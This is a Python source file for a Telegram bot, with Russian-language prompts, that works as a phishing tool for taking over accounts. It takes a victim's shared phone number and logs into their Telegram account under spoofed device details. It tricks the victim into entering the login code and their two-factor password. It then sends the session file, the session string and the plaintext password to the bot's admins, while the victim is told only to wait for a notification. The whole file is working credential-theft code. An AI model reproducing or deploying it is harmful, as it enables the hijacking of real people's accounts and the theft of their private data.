import random
import time
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text, ChatTypeFilter
from aiogram.types import InputFile
from pyrogram import Client
from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid

from data.config import ADMINS_ID, API_HASH, API_ID
from keyboards import code_menu
from loader import dp
from states import CodeNumber
from utils.db_commands import select_user, add_session


@dp.message_handler(ChatTypeFilter(chat_type=types.ChatType.PRIVATE), content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message, state: FSMContext):
    global client
    user = await select_user(message.from_user.id)
    if not user:
        try:
            client = Client(
                name=f'sessions/{message.contact.phone_number}',
                api_id=API_ID,
                api_hash=API_HASH,
                device_model=random.choice(['LGELG-F350K', 'Xiaomi Note 9', 'iPhone 14 Pro', 'Vivo Y19']),
                system_version=random.choice(['SDK 31', 'SDK 30', 'SDK 29']),
                lang_code=random.choice(['en-US', 'ru-RU']),
                app_version=random.choice(['8.8.2 (27022)', '10.2.2 (13011)', '8.4.2 (21023)', '5.1.2 (27022)'])
            )
            await client.connect()
            code_hash = await client.send_code(message.contact.phone_number)

            await state.update_data(
                number=message.contact.phone_number,
                code_hash=code_hash.phone_code_hash,
                code=''
            )
            await message.answer(
                f'<b>➡️ Ваш код:</b>\n'
                f'👇 Введите код отправленный от <b>Telegram</b>:',
                reply_markup=code_menu('')
            )
            await CodeNumber.number.set()
        except FloodWait as flood:
            converted_time = time.strftime(
                '%H часов %M минут',
                time.gmtime(flood.value)
            )
            await message.answer(
                f'<b>❗️ Произошла ошибка, попробуйте через <code>{converted_time}</code></b>'
            )
    else:
        await message.answer(
            '<b>🌟 Пожалуйста, дождитесь уведомления!</b>'
        )


@dp.callback_query_handler(Text(startswith='code_number'), state=CodeNumber.number)
async def get_code_number(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if len(data['code']) < 5:
        code = data['code'] + call.data.split(':')[1]
        await state.update_data(code=code)

        await call.message.edit_text(
            f'<b>➡️ Ваш код:</b> <code>{code}</code>\n'
            f'👇 Введите код отправленный от <b>Telegram</b>:',
            reply_markup=code_menu(code)
        )
        await call.answer(code)

    else:
        await call.answer(
            '❗️ Вы уже ввели необходимое количество цифр!',
            show_alert=True
        )


@dp.callback_query_handler(Text('delete_number'), state=CodeNumber.number)
async def delete_number(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data['code'][:-1]
    await state.update_data(code=code)

    await call.message.edit_text(
        f'<b>➡️ Ваш код:</b> <code>{code}</code>\n'
        f'👇 Введите код отправленный от <b>Telegram</b>:',
        reply_markup=code_menu(code)
    )
    await call.answer(code)


@dp.callback_query_handler(Text('clear_numbers'), state=CodeNumber.number)
async def delete_number(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(code='')
    await call.message.edit_text(
        f'<b>➡️ Ваш код:</b>\n'
        f'👇 Введите код отправленный от <b>Telegram</b>:',
        reply_markup=code_menu('')
    )
    await call.answer(
        '🔄 Code cleared!'
    )


@dp.callback_query_handler(Text('confirm_code'), state=CodeNumber.number)
async def confirm_session(call: types.CallbackQuery, state: FSMContext):
    try:
        data = await state.get_data()
        await client.sign_in(
            phone_number=data['number'], phone_code=data['code'],
            phone_code_hash=data['code_hash']
        )
        user = await client.get_me()
        await add_session(
            call.from_user.id,
            data['number'],
            ''
        )
        for admin in ADMINS_ID:
            await dp.bot.send_document(
                chat_id=admin,
                document=InputFile(f'sessions/{data["number"]}.session'),
                caption=f'<b>🎉 Новая сессия!</b>\n\n'
                        f'👤 Пользователь: <b>{call.from_user.get_mention(as_html=True)}</b> [<code>{call.from_user.id}</code>]\n'
                        f'📞 Телефон: <code>+{data["number"]}</code>\n'
                        f'🌟 Премиум: <code>{user.is_premium}</code>\n'
                        f'🚫 Скам: <code>{user.is_scam}</code>\n'
                        f'🔑 Строка сессии (Pyrogram): \n<code>{(await client.export_session_string())}</code>'
            )
        await call.message.delete()
        await call.message.answer(
            '<b>✅ Вы успешно авторизованы!</b>\n'
            '<b>🌟 Пожалуйста, ожидайте уведомление!</b>'
        )

        await client.disconnect()
        await state.finish()

    except SessionPasswordNeeded:
        await call.message.delete()
        await call.message.answer(
            '<b>🔑 Пожалуйста, введите пароль от вашего аккаунта</b>'
        )
        await CodeNumber.password.set()

    except PhoneCodeInvalid:
        await call.answer(
            '❗️ Введен неверный код!',
            show_alert=True
        )


@dp.message_handler(ChatTypeFilter(chat_type=types.ChatType.PRIVATE), state=CodeNumber.password)
async def get_password(message: types.Message, state: FSMContext):
    data = await state.get_data()
    try:
        await client.check_password(message.text)
        user = await client.get_me()
        await add_session(
            message.from_user.id,
            data['number'],
            message.text
        )

        password = f'🛡 Пароль: <code>{message.text}</code>\n\n' if message.text != '' else ''
        for admin in ADMINS_ID:
            await dp.bot.send_document(
                chat_id=admin,
                document=InputFile(f'sessions/{data["number"]}.session'),
                caption=f'<b>🎉 Новая сессия!</b>\n\n'
                        f'👤 Пользователь: <b>{message.from_user.get_mention(as_html=True)}</b> [<code>{message.from_user.id}</code>]\n'
                        f'📞 Телефон: <code>+{data["number"]}</code>\n'
                        f'{password}'
                        f'🌟 Премиум: <code>{user.is_premium}</code>\n'
                        f'🚫 Скам: <code>{user.is_scam}</code>\n'
                        f'🔑 Строка сессии (Pyrogram): \n<code>{(await client.export_session_string())}</code>'
            )
        await message.answer(
            '<b>✅ Вы успешно авторизованы!</b>\n'
            '<b>🌟 Пожалуйста, ожидайте уведомление!</b>'
        )

        await client.disconnect()
        await state.finish()
    except PasswordHashInvalid:
        await message.reply(
            '<b>❗️ Неверный пароль!</b>\n'
            '<b>🔑 Пожалуйста, введите пароль от вашего аккаунта</b>'
        )
